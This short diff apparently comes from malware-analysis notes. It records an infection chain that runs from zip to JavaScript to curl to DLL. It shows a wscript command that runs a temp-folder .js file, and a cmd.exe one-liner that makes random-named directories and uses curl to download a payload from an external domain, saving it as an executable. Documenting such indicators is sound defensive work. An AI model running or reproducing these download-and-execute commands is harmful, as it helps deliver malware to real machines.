@@ -9,7 +9,7 @@
 
 zip > js > curl > .dll
 
-wscript.exe C:\Users\Admin\AppData\Local\Temp\magic.js
+wscript.exe C:\Users\Admin\AppData\Local\Temp\Qih.js
 
 cmd.exe /c mkdir  C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf & curl https://berringtonnews.com/0bvKZ/0.16410464051883017.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
 
